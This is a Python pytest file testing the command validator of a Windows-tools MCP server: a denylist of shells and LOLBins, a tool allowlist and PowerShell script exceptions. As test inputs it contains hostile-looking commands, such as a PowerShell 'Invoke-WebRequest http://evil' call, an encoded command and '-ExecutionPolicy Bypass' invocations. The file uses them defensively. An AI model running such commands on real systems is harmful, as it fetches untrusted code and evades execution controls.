"""Tests for catalog module — denylist, allowlist, PS exceptions."""

import pytest
from pathlib import Path

from wintools_mcp.catalog import (
    BLOCKED_BINARIES,
    PS_SCRIPT_EXCEPTIONS,
    clear_catalog_cache,
    get_tool_def,
    is_in_catalog,
    load_catalog,
    validate_command,
    _is_valid_ps_exception,
)


@pytest.fixture
def test_catalog(tmp_path, monkeypatch):
    """Set up a test catalog."""
    cat_dir = tmp_path / "catalog"
    cat_dir.mkdir()
    yaml_content = """
category: test
tools:
  - name: TestTool
    binary: testtool.exe
    description: A test tool
    input_flag: "-f"
    output_format: text
    install_methods:
      - method: direct
        url: "https://example.com/testtool"
"""
    (cat_dir / "test.yaml").write_text(yaml_content)
    monkeypatch.setenv("WINTOOLS_CATALOG_DIR", str(cat_dir))
    return cat_dir


class TestDenylist:

    def test_cmd_blocked(self, test_catalog):
        assert validate_command(["cmd.exe", "/c", "dir"]) is not None
        assert "blocked" in validate_command(["cmd.exe"]).lower()

    def test_powershell_blocked_without_exception(self, test_catalog):
        result = validate_command(["powershell.exe", "-Command", "Get-Process"])
        assert result is not None
        assert "PowerShell" in result

    def test_certutil_blocked(self, test_catalog):
        result = validate_command(["certutil.exe", "-hashfile", "test.exe"])
        assert result is not None
        assert "blocked" in result.lower()

    def test_wsl_blocked(self, test_catalog):
        assert validate_command(["wsl.exe"]) is not None
        assert validate_command(["bash.exe"]) is not None

    def test_all_denylist_entries_blocked(self, test_catalog):
        for binary in BLOCKED_BINARIES:
            if binary in ("powershell", "powershell.exe", "pwsh", "pwsh.exe"):
                continue  # These go through PS exception path
            result = validate_command([binary, "--help"])
            assert result is not None, f"{binary} should be blocked"

    def test_empty_command(self, test_catalog):
        assert validate_command([]) == "Empty command"


class TestAllowlist:

    def test_cataloged_tool_allowed(self, test_catalog):
        result = validate_command(["testtool.exe", "-f", "input.hve"])
        assert result is None  # No error = allowed

    def test_unknown_tool_rejected(self, test_catalog):
        result = validate_command(["unknowntool.exe", "-f", "input"])
        assert result is not None
        assert "not in the approved tool catalog" in result

    def test_case_insensitive_lookup(self, test_catalog):
        td = get_tool_def("TestTool")
        assert td is not None
        assert td.binary == "testtool.exe"

    def test_is_in_catalog(self, test_catalog):
        assert is_in_catalog("testtool.exe") is True
        assert is_in_catalog("unknown.exe") is False


class TestPsException:

    def test_valid_ps_exception(self, test_catalog):
        cmd = [
            "powershell.exe",
            "-NoProfile",
            "-ExecutionPolicy", "Bypass",
            "-File", "C:\\Scripts\\Get-InjectedThreadEx.ps1",
        ]
        assert _is_valid_ps_exception(cmd) is True

    def test_ps_exception_rejects_command_flag(self, test_catalog):
        cmd = [
            "powershell.exe",
            "-NoProfile",
            "-ExecutionPolicy", "Bypass",
            "-Command", "Get-Process",
        ]
        assert _is_valid_ps_exception(cmd) is False

    def test_ps_exception_rejects_encoded_command(self, test_catalog):
        cmd = [
            "powershell.exe",
            "-NoProfile",
            "-ExecutionPolicy", "Bypass",
            "-EncodedCommand", "R2V0LVByb2Nlc3M=",
        ]
        assert _is_valid_ps_exception(cmd) is False

    def test_ps_exception_requires_noprofile(self, test_catalog):
        cmd = [
            "powershell.exe",
            "-ExecutionPolicy", "Bypass",
            "-File", "C:\\Scripts\\Get-InjectedThreadEx.ps1",
        ]
        assert _is_valid_ps_exception(cmd) is False

    def test_ps_exception_requires_execution_policy(self, test_catalog):
        cmd = [
            "powershell.exe",
            "-NoProfile",
            "-File", "C:\\Scripts\\Get-InjectedThreadEx.ps1",
        ]
        assert _is_valid_ps_exception(cmd) is False

    def test_ps_exception_rejects_uncataloged_script(self, test_catalog):
        cmd = [
            "powershell.exe",
            "-NoProfile",
            "-ExecutionPolicy", "Bypass",
            "-File", "C:\\Scripts\\Evil.ps1",
        ]
        assert _is_valid_ps_exception(cmd) is False

    def test_ps_exception_requires_file_flag(self, test_catalog):
        cmd = [
            "powershell.exe",
            "-NoProfile",
            "-ExecutionPolicy", "Bypass",
        ]
        assert _is_valid_ps_exception(cmd) is False

    def test_validate_command_allows_valid_ps(self, test_catalog):
        cmd = [
            "powershell.exe",
            "-NoProfile",
            "-ExecutionPolicy", "Bypass",
            "-File", "C:\\Scripts\\Get-InjectedThreadEx.ps1",
        ]
        assert validate_command(cmd) is None

    def test_validate_command_blocks_arbitrary_ps(self, test_catalog):
        cmd = ["powershell.exe", "-Command", "Invoke-WebRequest http://evil"]
        result = validate_command(cmd)
        assert result is not None
        assert "PowerShell" in result


class TestCatalogLoading:

    def test_load_with_install_methods(self, test_catalog):
        catalog = load_catalog()
        td = catalog.get("testtool")
        assert td is not None
        assert len(td.install_methods) == 1
        assert td.install_methods[0].method == "direct"

    def test_clear_cache(self, test_catalog):
        load_catalog()
        clear_catalog_cache()
        # After clear, next load should re-read
        catalog = load_catalog()
        assert len(catalog) > 0
